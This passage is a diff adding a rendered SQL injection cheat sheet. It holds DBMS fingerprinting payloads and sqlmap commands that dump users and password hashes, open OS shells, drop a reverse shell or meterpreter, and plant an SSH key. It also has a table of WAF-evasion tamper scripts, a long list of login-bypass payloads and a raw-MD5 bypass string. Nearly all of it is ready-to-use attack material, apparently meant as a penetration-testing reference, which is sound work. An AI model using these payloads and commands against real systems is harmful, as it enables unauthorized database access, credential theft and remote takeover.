+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;last_insert_rowid()&gt;1&#34;</span>                           ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;last_insert_rowid()=last_insert_rowid()&#34;</span>         ,<span style="color:#e6db74">&#34;SQLITE&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;val(cvar(1))=1&#34;</span>                                  ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;IIF(ATN(2)&gt;0,1,0) BETWEEN 2 AND 0&#34;</span>               ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;cdbl(1)=cdbl(1)&#34;</span>                                 ,<span style="color:#e6db74">&#34;MSACCESS&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;1337=1337&#34;</span>,   <span style="color:#e6db74">&#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&#34;</span>],
+</span></span><span style="display:flex;"><span>[<span style="color:#e6db74">&#34;&#39;i&#39;=&#39;i&#39;&#34;</span>,     <span style="color:#e6db74">&#34;MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL&#34;</span>],
+</span></span></code></pre></div><h2 id="sql-injection-using-sqlmap">
+  SQL injection using SQLmap
+  <a class="anchor" href="#sql-injection-using-sqlmap">#</a>
+</h2>
+<h3 id="basic-arguments-for-sqlmap">
+  Basic arguments for SQLmap
+  <a class="anchor" href="#basic-arguments-for-sqlmap">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap --url=<span style="color:#e6db74">&#34;&lt;url&gt;&#34;</span> -p username --user-agent=SQLMAP --random-agent --threads=<span style="color:#ae81ff">10</span> --risk=<span style="color:#ae81ff">3</span> --level=<span style="color:#ae81ff">5</span> --eta --dbms=MySQL --os=Linux --banner -<span style="color:#f92672">-is</span>-dba --users --passwords --current-user --dbs
+</span></span></code></pre></div><h3 id="load-a-request-file-and-use-mobile-user-agent">
+  Load a request file and use mobile user-agent
+  <a class="anchor" href="#load-a-request-file-and-use-mobile-user-agent">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -r sqli.req --safe-url=http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.10.<span style="color:#ae81ff">10</span>/ --mobile --safe-freq=<span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><h3 id="custom-injection-in-useragentheaderreferercookie">
+  Custom injection in UserAgent/Header/Referer/Cookie
+  <a class="anchor" href="#custom-injection-in-useragentheaderreferercookie">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com&#34;</span> --data <span style="color:#e6db74">&#34;username=admin&amp;password=pass&#34;</span>  --headers=<span style="color:#e6db74">&#34;x-forwarded-for:127.0.0.1*&#34;</span>
+</span></span><span style="display:flex;"><span>The injection is located at the <span style="color:#e6db74">&#39;*&#39;</span>
+</span></span></code></pre></div><h3 id="second-order-injection">
+  Second order injection
+  <a class="anchor" href="#second-order-injection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order <span style="color:#e6db74">&#34;http://targetapp/wishlist&#34;</span> -v <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>sqlmap -r <span style="color:#ae81ff">1</span>.txt -dbms MySQL -second-order <span style="color:#e6db74">&#34;http://&lt;IP/domain&gt;/joomla/administrator/index.php&#34;</span> -D <span style="color:#e6db74">&#34;joomla&#34;</span> -dbs
+</span></span></code></pre></div><h3 id="shell">
+  Shell
+  <a class="anchor" href="#shell">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>SQL Shell
+</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --sql-shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Simple Shell
+</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --os-shell
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Dropping a reverse-shell / meterpreter
+</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --os-pwn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SSH Shell by dropping an SSH key
+</span></span><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span> -p id -<span style="color:#f92672">-file</span>-write=/root/.ssh/id_rsa.pub -<span style="color:#f92672">-file</span>-destination=/home/user/.ssh/
+</span></span></code></pre></div><h3 id="crawl-a-website-with-sqlmap-and-auto-exploit">
+  Crawl a website with SQLmap and auto-exploit
+  <a class="anchor" href="#crawl-a-website-with-sqlmap-and-auto-exploit">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://example.com/&#34;</span> --crawl=<span style="color:#ae81ff">1</span> --random-agent --batch --forms --threads=<span style="color:#ae81ff">5</span> --level=<span style="color:#ae81ff">5</span> --risk=<span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the <span style="color:#66d9ef">default</span> answers
+</span></span><span style="display:flex;"><span>--crawl = how deep you want to crawl a site
+</span></span><span style="display:flex;"><span>--forms = Parse and test forms
+</span></span></code></pre></div><h3 id="using-tor-with-sqlmap">
+  Using TOR with SQLmap
+  <a class="anchor" href="#using-tor-with-sqlmap">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --tor --tor-type=SOCKS5 --time-sec <span style="color:#ae81ff">11</span> --check-tor --level=<span style="color:#ae81ff">5</span> --risk=<span style="color:#ae81ff">3</span> --threads=<span style="color:#ae81ff">5</span>
+</span></span></code></pre></div><h3 id="using-a-proxy-with-sqlmap">
+  Using a proxy with SQLmap
+  <a class="anchor" href="#using-a-proxy-with-sqlmap">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;http://www.target.com&#34;</span> --proxy=<span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>
+</span></span></code></pre></div><h3 id="using-chrome-cookie-and-a-proxy">
+  Using Chrome cookie and a Proxy
+  <a class="anchor" href="#using-chrome-cookie-and-a-proxy">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#34;https://test.com/index.php?id=99&#34;</span> --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy <span style="color:#e6db74">&#34;http://127.0.0.1:8080&#34;</span>  <span style="color:#f92672">-f</span>  --time-sec <span style="color:#ae81ff">15</span> --level <span style="color:#ae81ff">3</span>
+</span></span></code></pre></div><h3 id="using-suffix-to-tamper-the-injection">
+  Using suffix to tamper the injection
+  <a class="anchor" href="#using-suffix-to-tamper-the-injection">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python sqlmap.py -u <span style="color:#e6db74">&#34;http://example.com/?id=1&#34;</span>  -p id --suffix=<span style="color:#e6db74">&#34;-- &#34;</span>
+</span></span></code></pre></div><h3 id="general-tamper-option-and-tampers-list">
+  General tamper option and tamper&rsquo;s list
+  <a class="anchor" href="#general-tamper-option-and-tampers-list">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>tamper=name_of_the_tamper
+</span></span></code></pre></div><pre tabindex="0"><code>| Tamper | Description |
+| ------------- | ------------- |
+| 0x2char.py | Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),…) counterpart |
+| apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
+| apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart |
+| appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
+| base64encode.py | Base64 all characters in a given payload  |
+| between.py | Replaces greater than operator (&#39;&gt;&#39;) with &#39;NOT BETWEEN 0 AND #&#39; |
+| bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
+| chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
+| charencode.py | URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54) |
+| charunicodeencode.py | Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054) |
+| charunicodeescape.py | Unicode-escapes non-encoded characters in a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054) |
+| commalesslimit.py | Replaces instances like &#39;LIMIT M, N&#39; with &#39;LIMIT N OFFSET M&#39; |
+| commalessmid.py | Replaces instances like &#39;MID(A, B, C)&#39; with &#39;MID(A FROM B FOR C)&#39; |
+| commentbeforeparentheses.py | Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/() |
+| concat2concatws.py | Replaces instances like &#39;CONCAT(A, B)&#39; with &#39;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#39; |
+| charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
+| charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
+| equaltolike.py | Replaces all occurrences of operator equal (&#39;=&#39;) with operator &#39;LIKE&#39;  |
+| escapequotes.py | Slash escape quotes (&#39; and &#34;) |
+| greatest.py | Replaces greater than operator (&#39;&gt;&#39;) with &#39;GREATEST&#39; counterpart |
+| halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
+| htmlencode.py | HTML encode (using code points) all non-alphanumeric characters (e.g. ‘ -&gt; &amp;#39;) |
+| ifnull2casewhenisnull.py | Replaces instances like ‘IFNULL(A, B)’ with ‘CASE WHEN ISNULL(A) THEN (B) ELSE (A) END’ counterpart | 
+| ifnull2ifisnull.py | Replaces instances like &#39;IFNULL(A, B)&#39; with &#39;IF(ISNULL(A), B, A)&#39; |
+| informationschemacomment.py | Add an inline comment (/**/) to the end of all occurrences of (MySQL) “information_schema” identifier |
+| least.py | Replaces greater than operator (‘&gt;’) with ‘LEAST’ counterpart |
+| lowercase.py | Replaces each keyword character with lower case value (e.g. SELECT -&gt; select) |
+| modsecurityversioned.py | Embraces complete query with versioned comment |
+| modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
+| multiplespaces.py | Adds multiple spaces around SQL keywords |
+| nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace(&#34;SELECT&#34;, &#34;&#34;)) filters|
+| overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
+| overlongutf8more.py | Converts all characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94) |
+| percentage.py | Adds a percentage sign (&#39;%&#39;) infront of each character  |
+| plus2concat.py | Replaces plus operator (‘+’) with (MsSQL) function CONCAT() counterpart |
+| plus2fnconcat.py | Replaces plus operator (‘+’) with (MsSQL) ODBC function {fn CONCAT()} counterpart |
+| randomcase.py | Replaces each keyword character with random case value |
+| randomcomments.py | Add random comments to SQL keywords |
+| securesphere.py | Appends special crafted string |
+| sp_password.py |  Appends &#39;sp_password&#39; to the end of the payload for automatic obfuscation from DBMS logs |
+| space2comment.py | Replaces space character (&#39; &#39;) with comments |
+| space2dash.py | Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a random string and a new line (&#39;\n&#39;) |
+| space2hash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;) |
+| space2morehash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a random string and a new line (&#39;\n&#39;) |
+| space2mssqlblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
+| space2mssqlhash.py | Replaces space character (&#39; &#39;) with a pound character (&#39;#&#39;) followed by a new line (&#39;\n&#39;) |
+| space2mysqlblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
+| space2mysqldash.py | Replaces space character (&#39; &#39;) with a dash comment (&#39;--&#39;) followed by a new line (&#39;\n&#39;) |
+| space2plus.py |  Replaces space character (&#39; &#39;) with plus (&#39;+&#39;)  |
+| space2randomblank.py | Replaces space character (&#39; &#39;) with a random blank character from a valid set of alternate characters |
+| symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and ||) |
+| unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
+| unmagicquotes.py | Replaces quote character (&#39;) with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
+| uppercase.py | Replaces each keyword character with upper case value &#39;INSERT&#39;|
+| varnish.py | Append a HTTP header &#39;X-originating-IP&#39; |
+| versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
+| versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
+| xforwardedfor.py | Append a fake HTTP header &#39;X-Forwarded-For&#39; |
+</code></pre><h3 id="sqlmap-without-sql-injection">
+  SQLmap without SQL injection
+  <a class="anchor" href="#sqlmap-without-sql-injection">#</a>
+</h3>
+<p>You can use SQLmap to access a database via its port instead of a URL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-ps1" data-lang="ps1"><span style="display:flex;"><span>sqlmap.py -d <span style="color:#e6db74">&#34;mysql://user:pass@ip/database&#34;</span> --dump-all 
+</span></span></code></pre></div><h2 id="authentication-bypass">
+  Authentication bypass
+  <a class="anchor" href="#authentication-bypass">#</a>
+</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39;-&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; &#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&amp;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;^&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;*&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or 1=1 limit 1 -- -+
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;or&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;-&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39; &#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;&amp;&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;^&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;*&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;-||0&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">-||</span><span style="color:#ae81ff">0</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">-</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&amp;</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;--&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#75715e">--&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;--&#39;</span> <span style="color:#f92672">/</span> <span style="color:#e6db74">&#34;--&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;-&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34; &#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;&amp;&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;^&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;&#34;*&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">or</span> <span style="color:#66d9ef">true</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#34; or true--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or true--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">or</span> <span style="color:#66d9ef">true</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#e6db74">&#39;) or true--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;x&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;x&#39;</span>)<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;</span>)) <span style="color:#66d9ef">or</span> ((<span style="color:#e6db74">&#39;x&#39;</span>))<span style="color:#f92672">=</span>((<span style="color:#e6db74">&#39;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34; or &#34;x&#34;=&#34;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;) or (&#34;x&#34;)=(&#34;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;)) or ((&#34;x&#34;))=((&#34;x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 2 like 2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">or 1=1/*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; -- -
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#ae81ff">2</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; or 2 LIKE 2#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;) or 2 LIKE 2--
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;2
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span>) <span style="color:#66d9ef">or</span> (<span style="color:#e6db74">&#39;2&#39;</span> <span style="color:#66d9ef">LIKE</span> <span style="color:#e6db74">&#39;2&#39;</span><span style="color:#f92672">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39;) or (&#39;</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39; LIKE &#39;</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">&#39;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">admin</span><span style="color:#e6db74">&#39; or &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;#
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">admin&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;or 1=1 or &#39;&#39;=&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39; or 1=1/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or (&#39;1&#39;=&#39;1&#39;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;) or &#39;1&#39;=&#39;1&#39;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1234 &#39; AND 1=0 UNION ALL SELECT &#39;admin&#39;, &#39;81dc9bdb52d04dc20036dbd8313ed055
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; --
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#39;;-- azer 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; #
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or &#34;1&#34;=&#34;1&#34;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;or 1=1 or &#34;&#34;=&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34; or 1=1/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or (&#34;1&#34;=&#34;1&#34;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;--
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;#
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">admin&#34;) or &#34;1&#34;=&#34;1&#34;/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">1234 &#34; AND 1=0 UNION ALL SELECT &#34;admin&#34;, &#34;81dc9bdb52d04dc20036dbd8313ed055
+</span></span></span></code></pre></div><h2 id="authentication-bypass-raw-md5-sha1">
+  Authentication Bypass (Raw MD5 SHA1)
+  <a class="anchor" href="#authentication-bypass-raw-md5-sha1">#</a>
+</h2>
+<p>When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">&#34;SELECT * FROM admin WHERE pass = &#39;&#34;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">md5</span>($password,<span style="color:#66d9ef">true</span>)<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;&#39;&#34;</span>
+</span></span></code></pre></div><p>Allowing an attacker to craft a string with a <code>true</code> statement such as <code>' or 'SOMETHING</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">md5</span>(<span style="color:#e6db74">&#34;ffifdyop&#34;</span>, <span style="color:#66d9ef">true</span>) <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;or&#39;</span><span style="color:#ae81ff">6</span><span style="color:#a6e22e">�</span>]<span style="color:#a6e22e">��</span><span style="color:#f92672">!</span><span style="color:#a6e22e">r</span>,<span style="color:#a6e22e">��b</span><span style="color:#960050;background-color:#1e0010"></span>
